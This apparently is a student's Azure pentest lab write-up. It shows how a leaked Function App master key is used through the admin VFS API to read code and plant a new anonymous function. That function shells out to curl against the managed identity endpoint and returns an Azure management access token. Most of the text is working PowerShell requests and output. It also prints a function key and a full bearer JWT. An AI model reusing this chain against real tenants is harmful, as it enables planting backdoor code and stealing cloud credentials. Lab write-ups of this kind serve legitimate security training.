# Attack Lab 20

```
− Leverage the Master Key to read the source code compositionprocessing Function App.
− Create a new HTTPTrigger using Master Key to request Access Token by leveraging Managed Identity.
− Enumerate the Resources using the Access Token.
```

Previous datas:

```
KeyId     : https://compositionsecrets.vault.azure.net/keys/EncryptionKey/e117ee35db434bc799fff01f5f36fea3
Result    : 7JGHkhp1cWbNdZbZmEsdSqwwu2p-pbG7afGcc55qNyWUAzFufM557w==
Algorithm : RSA1_5
```

Extract default source code data of compositionprocessing application:

```
$URL = "https://compositionprocessing.azurewebsites.net/admin/vfs/home/site/wwwroot/HttpTrigger1/__init__.py"
$Params = @{
"URI" = $URL
"Method" = "GET"
"Headers" = @{
"Content-Type" = "application/octet-stream"
"x-functions-key" = "7JGHkhp1cWbNdZbZmEsdSqwwu2p-pbG7afGcc55qNyWUAzFufM557w=="
}
}
Invoke-RestMethod @Params -UseBasicParsing
```

Output:

```
PS C:\Users\studentuser107> $URL = "https://compositionprocessing.azurewebsites.net/admin/vfs/home/site/wwwroot/HttpTrigger1/__init__.py"
$Params = @{
"URI" = $URL
"Method" = "GET"
"Headers" = @{
"Content-Type" = "application/octet-stream"
"x-functions-key" = "7JGHkhp1cWbNdZbZmEsdSqwwu2p-pbG7afGcc55qNyWUAzFufM557w=="
}
}
Invoke-RestMethod @Params -UseBasicParsing
ï»¿import logging

import azure.functions as func


def main(req: func.HttpRequest) -> func.HttpResponse:
    logging.info('Python HTTP trigger function processed a request.')

    name = req.params.get('name')
    if not name:
        try:
            req_body = req.get_json()
        except ValueError:
            pass
        else:
            name = req_body.get('name')

    if name:
        return func.HttpResponse(f"Hello, {name}. This HTTP triggered function executed successfully.")
    else:
        return func.HttpResponse(
             "This HTTP triggered function executed successfully. Pass a name in the query string or in the request body for a personalized response.",
             status_code=200
        )

```

Manage funcitonal app application content:

```
#Put data on functional app:

$URL = "https://compositionprocessing.azurewebsites.net/admin/vfs/home/site/wwwroot/Student107_auth_token/__init__.py"
$Params = @{
    "URI" = $URL
    "Method" = "PUT"
    "Headers" = @{
        "Content-Type" = "application/octet-stream"
        "x-functions-key" = "7JGHkhp1cWbNdZbZmEsdSqwwu2p-pbG7afGcc55qNyWUAzFufM557w=="
    }
}

$Body = @"
import logging, os
import azure.functions as func

def main(req: func.HttpRequest) -> func.HttpResponse:
    logging.info('Python HTTP trigger function processed a request.')
    IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT']
    IDENTITY_HEADER = os.environ['IDENTITY_HEADER']
    cmd = 'curl "%s?resource=https://management.azure.com&api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
    val = os.popen(cmd).read()
    return func.HttpResponse(val, status_code=200)
"@
Invoke-RestMethod @Params -UseBasicParsing -Body $Body

```

Validate content:

```
#validate content of funcitonal app

$URL = "https://compositionprocessing.azurewebsites.net/admin/vfs/home/site/wwwroot/Student107_auth_token/__init__.py"
$Params = @{
    "URI" = $URL
    "Method" = "GET"
    "Headers" = @{
        "Content-Type" = "application/octet-stream"
        "x-functions-key" = "7JGHkhp1cWbNdZbZmEsdSqwwu2p-pbG7afGcc55qNyWUAzFufM557w=="
    }
}
Invoke-RestMethod @Params -UseBasicParsing
```

Output:
```
PS C:\Users\studentuser107> $URL = "https://compositionprocessing.azurewebsites.net/admin/vfs/home/site/wwwroot/Student107_auth_token/__init__.py"
$Params = @{
    "URI" = $URL
    "Method" = "GET"
    "Headers" = @{
        "Content-Type" = "application/octet-stream"
        "x-functions-key" = "7JGHkhp1cWbNdZbZmEsdSqwwu2p-pbG7afGcc55qNyWUAzFufM557w=="
    }
}
Invoke-RestMethod @Params -UseBasicParsing
import logging, os
import azure.functions as func

def main(req: func.HttpRequest) -> func.HttpResponse:
    logging.info('Python HTTP trigger function processed a request.')
    IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT']
    IDENTITY_HEADER = os.environ['IDENTITY_HEADER']
    cmd = 'curl "%s?resource=https://management.azure.com&api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
    val = os.popen(cmd).read()
    return func.HttpResponse(val, status_code=200)
```
Include and valudate configruation files:

```
# FUnctional app configuration file

$URL = "https://compositionprocessing.azurewebsites.net/admin/vfs/home/site/wwwroot/Student107_auth_token/function.json"
$Params = @{
    "URI" = $URL
    "Method" = "PUT"
    "Headers" = @{
        "Content-Type" = "application/octet-stream"
        "x-functions-key" = "7JGHkhp1cWbNdZbZmEsdSqwwu2p-pbG7afGcc55qNyWUAzFufM557w=="
    }
}
$Body = @"
{
    "bindings": [
        {
            "authLevel": "anonymous",
            "type": "httpTrigger",
            "direction": "in",
            "name": "req",
            "methods": [
                "get",
                "post"
            ]
        },
        {
            "type": "http",
            "direction": "out",
            "name": "`$return"
        }
    ]
}
"@
Invoke-RestMethod @Params -UseBasicParsing -Body $Body

#validate content of funcitonal app configuration file

$URL = "https://compositionprocessing.azurewebsites.net/admin/vfs/home/site/wwwroot/Student107_auth_token/function.json"
$Params = @{
    "URI" = $URL
    "Method" = "GET"
    "Headers" = @{
        "Content-Type" = "application/octet-stream"
        "x-functions-key" = "7JGHkhp1cWbNdZbZmEsdSqwwu2p-pbG7afGcc55qNyWUAzFufM557w=="
    }
}
Invoke-RestMethod @Params -UseBasicParsing

```
Execution output:

```
PS C:\Users\studentuser107> $URL = "https://compositionprocessing.azurewebsites.net/admin/vfs/home/site/wwwroot/Student107_auth_token/function.json"
$Params = @{
    "URI" = $URL
    "Method" = "GET"
    "Headers" = @{
        "Content-Type" = "application/octet-stream"
        "x-functions-key" = "7JGHkhp1cWbNdZbZmEsdSqwwu2p-pbG7afGcc55qNyWUAzFufM557w=="
    }
}
Invoke-RestMethod @Params -UseBasicParsing

bindings                                                                                                                              
--------                                                                                                                              
{@{authLevel=anonymous; type=httpTrigger; direction=in; name=req; methods=System.Object[]}, @{type=http; direction=out; name=$return}}
```

Obtaining access token:

```
https://compositionprocessing.azurewebsites.net/api/Student107_auth_token
```

```
{"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ii1LSTNROW5OUjdiUm9meG1lWm9YcWJIWkdldyIsImtpZCI6Ii1LSTNROW5OUjdiUm9meG1lWm9YcWJIWkdldyJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tIiwiaXNzIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvZTBmOTk5YzEtODZlZS00N2EwLWJmZDUtMTg0NzAxNTRiN2NkLyIsImlhdCI6MTY5NzAxNTE0NywibmJmIjoxNjk3MDE1MTQ3LCJleHAiOjE2OTcxMDE4NDcsImFpbyI6IkUyRmdZSGl3MTJKTHFLWHk4WnBnVmJ0Y0RvNGpBQT09IiwiYXBwaWQiOiJjMjZjYWIxMi04MDU1LTQ3OWQtYTc2NC1kNjU2ZTQzOTI1NzciLCJhcHBpZGFjciI6IjIiLCJpZHAiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC9lMGY5OTljMS04NmVlLTQ3YTAtYmZkNS0xODQ3MDE1NGI3Y2QvIiwiaWR0eXAiOiJhcHAiLCJvaWQiOiIxZTIyZjU1YS00MzkyLTQwNjktYjgwOC01ODc2MGI4MzJlMjgiLCJyaCI6IjAuQVhFQXdabjU0TzZHb0VlXzFSaEhBVlMzelVaSWYza0F1dGRQdWtQYXdmajJNQk9IQUFBLiIsInN1YiI6IjFlMjJmNTVhLTQzOTItNDA2OS1iODA4LTU4NzYwYjgzMmUyOCIsInRpZCI6ImUwZjk5OWMxLTg2ZWUtNDdhMC1iZmQ1LTE4NDcwMTU0YjdjZCIsInV0aSI6IllYOGdqUDJ4UlVxc2hWdHloZGFlQUEiLCJ2ZXIiOiIxLjAiLCJ4bXNfY2FlIjoiMSIsInhtc19taXJpZCI6Ii9zdWJzY3JpcHRpb25zL2FhYzAyZjc0LWIwZDItNDVkMi04ZmJjLThkMzNmMjc0MTE2Zi9yZXNvdXJjZWdyb3Vwcy9Db21wb3NpdGlvbi9wcm92aWRlcnMvTWljcm9zb2Z0LldlYi9zaXRlcy9jb21wb3NpdGlvbnByb2Nlc3NpbmciLCJ4bXNfdGNkdCI6MTY1NTM1MzYyOH0.cOSZ-fgH1epiAhy4ZWMGZY69d1J6ac6y8g8tSMAUsUzZel2xSXHohvwqOSM3_hRUywIoxcG6QKSe0CgiOjvjyiOmTsgBtb0KdUPf5dgdS0Vlwt4iJuIb0gW0FcZ8DmHn2uRZhkgGwGibpVWsVBW6GjzijSBLEdwoYMFqbIc4EVI8VBOCE7hs_BG6jt-IIkgOMKGw9kNc5bkqfhz6JHr3NJIV3Ct338c03egKa59QE-TrOerG_zTzeT6u-z-4Di3QmV_8yiUK4DEbbygqton0lGEMpu25rYXvkJ9ZGDY6DIl3SKw2S3wn8b9xOcnTBetDd1OaAdPdJ_Et7HK6fJKHRw","expires_on":"10/12/2023 09:10:46 +00:00","resource":"https://management.azure.com","token_type":"Bearer","client_id":"c26cab12-8055-479d-a764-d656e4392577"}
```
